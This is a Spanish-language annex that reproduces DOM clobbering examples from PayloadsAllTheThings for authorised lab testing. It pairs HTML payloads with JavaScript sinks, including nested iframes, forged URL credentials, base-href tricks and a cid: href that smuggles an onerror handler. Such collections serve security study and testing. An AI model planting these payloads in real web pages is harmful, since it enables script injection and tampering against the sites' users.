# DOM clobbering: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [DOM Clobbering/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/DOM%20Clobbering/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. DOM Clobbering / Metodología

```html
    // Payload
    <form id=x><output id=y>I've been clobbered</output>

    // Sink
    <script>alert(x.y.value);</script>
```

```html
    // Payload
    <a id=x><a id=x name=y href="Clobbered">

    // Sink
    <script>alert(x.y)</script>
```

```html
    // Payload
    <form id=x name=y><input id=z></form>
    <form id=x></form>

    // Sink
    <script>alert(x.y.z)</script>
```

```html
    // Payload
    <iframe name=a srcdoc="
    <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>
    <style>@import '//portswigger.net';</style>

    // Sink
    <script>alert(a.b.c.d)</script>
```

```html
    // Payload
    <form id=x>
    <input id=y name=z>
    <input id=y>
    </form>

    // Sink
    <script>x.y.forEach(element=>alert(element))</script>
```

```html
    // Payloads
    <html id="cdnDomain">clobbered</html>
    <svg><body id=cdnDomain>clobbered</body></svg>


    // Sink 
    <script>
    alert(document.getElementById('cdnDomain').innerText);//clobbbered
    </script>
```

```html
    // Payload
    <a id=x href="ftp:Clobbered-username:Clobbered-Password@a">

    // Sink
    <script>
    alert(x.username)//Clobbered-username
    alert(x.password)//Clobbered-password
    </script>
```

```html
    // Payload
    <base href=a:abc><a id=x href="Firefox<>">

    // Sink
    <script>
    alert(x)//Firefox<>
    </script>
```

```html
    // Payload
    <base href="a://Clobbered<>"><a id=x name=x><a id=x name=xyz href=123>

    // Sink
    <script>
    alert(x.xyz)//a://Clobbered<>
    </script>
```

### Variantes presentes en tablas o texto del apartado

```text
x.y.value
x.y
x.y.z
a.b.c.d
document.getElementById()
<html>
<body>
x.username
```

## 2. DOM Clobbering / Trucos

### Variantes presentes en tablas o texto del apartado

```text
cid:
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
